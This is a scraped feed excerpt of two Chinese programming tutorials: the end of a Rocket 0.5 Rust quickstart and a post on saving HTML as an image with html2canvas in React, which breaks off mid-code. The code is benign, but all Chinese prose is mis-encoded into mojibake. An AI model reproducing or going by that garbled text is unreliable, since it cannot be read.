<h3 data-id="heading-6">3.1 æ–°å»ºä¸€ä¸ªè‡ªå·±çš„é¡¹ç›®ç›®å½•</h3>
<p>æ¯”å¦‚ä½ æƒ³å†™ä¸€ä¸ªè‡ªå·±çš„ Rocket æœåŠ¡å« <code>my-rocket-app</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">cargo new my-rocket-app --bin
<span class="hljs-built_in">cd</span> my-rocket-app
</code></pre>
<p>è¿™ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„ Rust äºŒè¿›åˆ¶é¡¹ç›®ç»“æ„ï¼š</p>
<pre><code class="hljs language-text" lang="text">my-rocket-app
â”œâ”€â”€ Cargo.toml
â””â”€â”€ src
    â””â”€â”€ main.rs
</code></pre>
<h3 data-id="heading-7">3.2 ä¿®æ”¹ Cargo.tomlï¼šä¾èµ– Rocket 0.5</h3>
<p>å°† <code>Cargo.toml</code> æ”¹æˆç±»ä¼¼è¿™æ ·ï¼ˆæ ¹æ®éœ€æ±‚æ·»åŠ  featuresï¼‰ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"my-rocket-app"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { version = <span class="hljs-string">"0.5.1"</span>, features = [<span class="hljs-string">"json"</span>, <span class="hljs-string">"secrets"</span>] }
<span class="hljs-comment"># å¦‚æœä½ éœ€è¦æ¨¡æ¿ï¼š</span>
<span class="hljs-comment"># rocket_dyn_templates = { version = "0.2.0", features = ["tera"] }</span>
<span class="hljs-comment"># å¦‚æœä½ éœ€è¦æ•°æ®åº“æ± ï¼š</span>
<span class="hljs-comment"># rocket_sync_db_pools = "0.1.0"</span>
</code></pre>
<p>æ³¨æ„ä¸¤ç‚¹ï¼š</p>
<ol>
<li>è¿™é‡Œçš„ <code>rocket</code> ä¸å†æ˜¯æŒ‡å‘æœ¬åœ°æºç ï¼Œè€Œæ˜¯æ­£å¸¸ä» crates.io æ‹‰å–ï¼›</li>
<li>ä½ éœ€è¦æ‰‹åŠ¨è¡¥ä¸Šä¹‹å‰ç¤ºä¾‹ä¸­ä¾èµ–çš„åŠŸèƒ½ï¼ˆæ¯”å¦‚ <code>json</code> / <code>secrets</code> / æ¨¡æ¿ç­‰ï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-8">3.3 å¤åˆ¶ç¤ºä¾‹ä»£ç åˆ°è‡ªå·±çš„ main.rs</h3>
<p>æ¯”å¦‚ä½ å–œæ¬¢ <code>examples/hello/src/main.rs</code> ä¸­çš„å†™æ³•ï¼Œå°±å¯ä»¥ç›´æ¥ copy å†…å®¹åˆ°è‡ªå·±çš„ <code>src/main.rs</code>ï¼Œç„¶åç¨ä½œä¿®æ”¹ï¼Œå˜æˆä½ è‡ªå·±çš„ç‰ˆæœ¬ã€‚</p>
<p>ä¸€ä¸ªæœ€è¿·ä½ çš„ Rocket 0.5 <code>main.rs</code> å¤§è‡´åƒè¿™æ ·ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, Rocket 0.5!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>ç„¶ååœ¨ä½ è‡ªå·±çš„é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>å¦‚æœèƒ½æ­£å¸¸å¯åŠ¨ã€è¿”å›äº†ä½ æœŸæœ›çš„å†…å®¹ï¼Œè¯´æ˜ä½ å·²ç»<strong>ä»â€œè·‘å®˜æ–¹ demoâ€æˆåŠŸè¿ˆè¿›åˆ°â€œæœ‰è‡ªå·±é¡¹ç›®â€è¿™ä¸€æ­¥</strong>ã€‚</p>
<h2 data-id="heading-9">å››ã€å¸¸è§ç–‘é—®ï¼šç¤ºä¾‹çš„ Cargo.toml å’Œæˆ‘è‡ªå·±çš„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2>
<p>çœ‹ examples ç›®å½•æ—¶ä½ å¯èƒ½ä¼šå‘ç°ï¼š
ç¤ºä¾‹é‡Œçš„ <code>Cargo.toml</code> ä¸æ˜¯ç›´æ¥å†™ <code>rocket = "0.5.1"</code>ï¼Œè€Œæ˜¯ç”¨æœ¬åœ°è·¯å¾„ä¾èµ–ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { path = <span class="hljs-string">"../../core/lib"</span>, features = [<span class="hljs-string">"json"</span>] }
</code></pre>
<p>è¿™æ˜¯å› ä¸ºï¼š</p>
<ul>
<li>examples éœ€è¦åœ¨ <strong>Rocket ä»“åº“å†…éƒ¨</strong>ç›´æ¥ç¼–è¯‘ã€è°ƒè¯•ï¼›</li>
<li>å®˜æ–¹å¼€å‘è€…ä¼šåœ¨æœ¬åœ°åå¤ä¿®æ”¹ Rocket æºç å¹¶åŠæ—¶éªŒè¯ç¤ºä¾‹æ˜¯å¦è¿˜èƒ½è·‘é€šï¼›</li>
<li>ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼Œç¤ºä¾‹ç›´æ¥ä¾èµ–ä»“åº“å†…çš„æºç ï¼Œè€Œä¸æ˜¯ crates.io ä¸Šçš„ç‰ˆæœ¬ã€‚</li>
</ul>
<p>è€Œä½ å»ºè‡ªå·±çš„é¡¹ç›®æ—¶ï¼Œ<strong>ä¸åº”è¯¥ç»§ç»­ç”¨ path ä¾èµ–</strong>ï¼Œè€Œæ˜¯åƒæ­£å¸¸ Rust é¡¹ç›®ä¸€æ ·æŒ‡å®šç‰ˆæœ¬å·ï¼Œè¿™æ ·ï¼š</p>
<ul>
<li>æ„å»ºã€éƒ¨ç½²è¿‡ç¨‹æ›´æ ‡å‡†ï¼›</li>
<li>ä¸ç”¨å¸¦ç€æ•´ä¸ª Rocket ä»“åº“ä¸€èµ·èµ°ï¼›</li>
<li>å‡çº§ Rocket æ—¶åªéœ€è¦æ”¹ <code>Cargo.toml</code> å³å¯ã€‚</li>
</ul>
<h2 data-id="heading-10">äº”ã€æ€»ç»“ï¼šQuickstart çš„â€œæ¨èè·¯çº¿å›¾â€</h2>
<p>å¯ä»¥æŠŠ Rocket 0.5 çš„å¿«é€Ÿä¸Šæ‰‹è·¯çº¿æ€»ç»“æˆ 4 æ­¥ï¼š</p>
<ol>
<li>
<p><strong>è£… Rust å·¥å…·é“¾ï¼ˆrustupï¼‰</strong></p>
</li>
<li>
<p><strong>å…‹éš† Rocket ä»“åº“å¹¶åˆ‡åˆ° v0.5</strong></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
git checkout v0.5
</code></pre>
</li>
<li>
<p><strong>è¿› examples è·‘ demo</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
</li>
<li>
<p><strong>æ–°å»ºè‡ªå·±çš„é¡¹ç›®ï¼Œç”¨ç¤ºä¾‹ä»£ç åšæ¨¡æ¿</strong></p>
<ul>
<li><code>cargo new my-rocket-app --bin</code></li>
<li>è°ƒæ•´ <code>Cargo.toml</code> ä¾èµ– <code>rocket = { version = "0.5.1", features = [...] }</code></li>
<li>æŠŠç¤ºä¾‹é‡Œä½ å–œæ¬¢çš„ main / routes å¤åˆ¶è¿‡æ¥æ”¹ä¸€æ”¹</li>
</ul>
</li>
</ol>
<p>åšåˆ°è¿™é‡Œï¼Œä½ å·²ç»å®Œæˆäº† Rocket çš„â€œå†·å¯åŠ¨â€ï¼š
ä»é›¶ â†’ è·‘ demo â†’ æ‹¥æœ‰è‡ªå·±çš„é¡¹ç›®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°†htmlè½¬åŒ–æˆå›¾ç‰‡]]></title>    <link>https://juejin.cn/post/7581786379803377699</link>    <guid>https://juejin.cn/post/7581786379803377699</guid>    <pubDate>2025-12-10T02:33:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379803377699" data-draft-id="7581750253000540195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°†htmlè½¬åŒ–æˆå›¾ç‰‡"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T02:33:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æ˜è®°è´¦ç°¿_å¾®ä¿¡å°ç¨‹åº"/> <meta itemprop="url" content="https://juejin.cn/user/1901536389893546"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°†htmlè½¬åŒ–æˆå›¾ç‰‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1901536389893546/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æ˜è®°è´¦ç°¿_å¾®ä¿¡å°ç¨‹åº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:33:14.000Z" title="Wed Dec 10 2025 02:33:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¦‚ä½•å°†æŒ‡å®šhtmlå†…å®¹è½¬åŒ–æˆå›¾ç‰‡ä¿å­˜ï¼Ÿè¿™ä¸ªé—®é¢˜å¾ˆå€¼å¾—æ·±æ€ï¼Œå®é™…åº”ç”¨ä¸­ä¹Ÿå¾ˆæœ‰ä»·å€¼ã€‚æœ€ç›´æ¥çš„æƒ³æ³•å°±æ˜¯ä½¿ç”¨<code>canvas</code>ï¼Œç†Ÿæ‚‰<code>canvas</code>çš„åŒå­¦å¯ä»¥å°è¯•ä¸€ä¸‹ã€‚è¿™é‡Œä¸åšå¤ªå¤šçš„è¯´æ˜ï¼Œæœ¬æ–‡é‡‡ç”¨<code>html2canvas</code>åº“æ¥å®ç°ã€‚</p>
</blockquote>
<p><code>html2canvas</code>åº“çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œåªéœ€è¦å¼•å…¥<code>html2canvas</code>åº“ï¼Œç„¶åè°ƒç”¨<code>html2canvas</code>æ–¹æ³•å³å¯ï¼Œ<a href="https://link.juejin.cn?target=http%3A%2F%2Fhtml2canvas.hertzen.com%2F" target="_blank" title="http://html2canvas.hertzen.com/" ref="nofollow noopener noreferrer">å®˜æ–¹åœ°å€</a>ã€‚</p>
<p>æ¥ä¸‹æ¥è¯´ä¸€ä¸‹ç®€å•çš„ä½¿ç”¨ï¼Œä»¥<code>react</code>é¡¹ç›®ä¸ºä¾‹ã€‚</p>
<p>è·å–æ•´ä¸ªé¡µé¢æˆªå›¾ï¼Œå¯ä»¥ä½¿ç”¨åº•å±‚ID<code>root</code>ï¼Œè¿™æ ·ä¸‹è½½çš„å°±æ˜¯<code>root</code>ä¸‹çš„æ‰€æœ‰å…ƒç´ ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d282e459eb14541870200efc3001db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=Zdrj6WPwaUNGC5R0tZi5F%2FfG1K8%3D" width="50%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> html2canvas <span class="hljs-keyword">from</span> <span class="hljs-string">"html2canvas"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">saveCanvas</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// ç”»å¸ƒåŸºç¡€å…ƒç´ ï¼Œè¦ç»˜åˆ¶çš„å…ƒç´ </span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"root"</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span> };
    <span class="hljs-title function_">html2canvas</span>(canvas, options).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">canvas</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> type = <span class="hljs-string">"png"</span>;
      <span class="hljs-comment">// è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°æ®urlï¼Œæ˜¯base64ç»„æˆçš„å›¾ç‰‡çš„æºæ•°æ®</span>
      <span class="hljs-keyword">let</span> imgDt = canvas.<span class="hljs-title function_">toDataURL</span>(type);
      <span class="hljs-keyword">let</span> fileName = <span class="hljs-string">"img"</span> + <span class="hljs-string">"."</span> + type;
      <span class="hljs-comment">// ä¿å­˜ä¸ºæ–‡ä»¶</span>
      <span class="hljs-keyword">let</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-property">href</span> = imgDt;
      a.<span class="hljs-property">download</span> = fileName;
      a.<span class="hljs-title function_">click</span>();
    });
  };
</code></pre>
<p>å›¾ç‰‡çš„é»˜è®¤èƒŒæ™¯è‰²æ˜¯<code>#ffffff</code>ï¼Œå¦‚æœæƒ³è¦é€æ˜è‰²å¯è®¾ç½®ä¸º<code>null</code>ï¼Œæ¯”å¦‚è®¾ç½®ä¸ºçº¢è‰²ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1c4b6bdfc054d8c8a800aa6a1030d70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=W3M6s470YEpjxNOJOSM3Z7HDX20%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span> };
</code></pre>
<p>æ­£å¸¸æƒ…å†µä¸‹ç½‘ç»œå›¾ç‰‡æ˜¯æ— æ³•æ¸²æŸ“çš„ï¼Œå¯ä»¥ä½¿ç”¨<code>useCORS</code>å±æ€§ï¼Œè®¾ç½®ä¸º<code>true</code>å³å¯ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec958d764f54d9995584d094f67ffe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=%2FjVHD84CpZTrf7Y689JHuLKYaFo%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span> };
</code></pre>
<p>ä¿å­˜æŸå—å…ƒç´ çš„æˆªå›¾</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a80dadfbdb4f4c5d9f61cd5fb538143e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=GWOn%2Bc8dIJ2ikH4Av9OzV64rkUU%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"swiper"</span>);
</code></pre>
<p>å¦‚æœå¸Œæœ›å°†æŸäº›å…ƒç´ æ’é™¤ï¼Œå¯ä»¥å°†<code>data-html2canvas-ignore</code>å±æ€§æ·»åŠ åˆ°è¿™äº›å…ƒç´ ä¸­ï¼Œ<code>html2canvas</code>å°†ä»æ¸²æŸ“ä¸­æ’é™¤è¿™äº›å…ƒç´ ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fcc603cf51e467b9dd3fecc7766833a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=mGLMC3Ubuynj3KpwUd10a5XjygE%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
  <span class="hljs-attr">data-html2canvas-ignore</span>
  <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
  <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>
  <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveCanvas}</span>
&gt;</span>
  download
<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
</code></pre>
<p>å®Œæ•´ä»£ç </p>
<pre><code class="hljs language-js" lang="js">npm install html2canvas
</code></pre>
<pre><code class="hljs language-css" lang="css">// demo<span class="hljs-selector-class">.less</span>
<span class="hljs-selector-class">.contentSwiper</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">710px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">375px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">48px</span>;
  user-select: none;
}
<span class="hljs-selector-class">.swiper</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Space</span>, <span class="hljs-title class_">Swiper</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd-mobile"</span>;
<span class="hljs-keyword">import</span> html2canvas <span class="hljs-keyword">from</span> <span class="hljs-string">"html2canvas"</span>;
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">"./demo.less"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">saveCanvas</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// ç”»å¸ƒåŸºç¡€å…ƒç´ ï¼Œè¦ç»˜åˆ¶çš„å…ƒç´ </span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"root"</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span>
  };
    <span class="hljs-title function_">html2canvas</span>(canvas, options).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">canvas</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> type = <span class="hljs-string">"png"</span>;
      <span class="hljs-comment">// è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°æ®urlï¼Œæ˜¯base64ç»„æˆçš„å›¾ç‰‡çš„æºæ•°æ®</span>
      <span class="hljs-keyword">let</span> imgDt = canvas.<span class="hljs-title function_">toDataURL</span>(type);
      <span class="hljs-keyword">let</span> fileName = <span class="hljs-string">"img"</span> + <span class="hljs-string">"."</span> + type;
      <span class="hljs-comment">// ä¿å­˜ä¸ºæ–‡ä»¶</span>
      <span class="hljs-keyword">let</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-property">href</span> = imgDt;
      a.<span class="hljs-property">download</span> = fileName;
      a.<span class="hljs-title function_">click</span>();
    });
  };
  <span class="hljs-keyword">const</span> <span class="hljs-attr">colors</span>: string[] = [<span class="hljs-string">"#ace0ff"</span>, <span class="hljs-string">"#bcffbd"</span>, <span class="hljs-string">"#e4fabd"</span>, <span class="hljs-string">"#ffcfac"</span>];
  <span class="hljs-keyword">const</span> items = colors.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">color, index</span>) =&gt;</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Swiper.Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.contentSwiper}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">background:</span> <span class="hljs-attr">color</span> }}&gt;</span>
        {index + 1}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Swiper.Item</span>&gt;</span></span>
  ));
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"swiper"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.swiper}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Swiper</span>
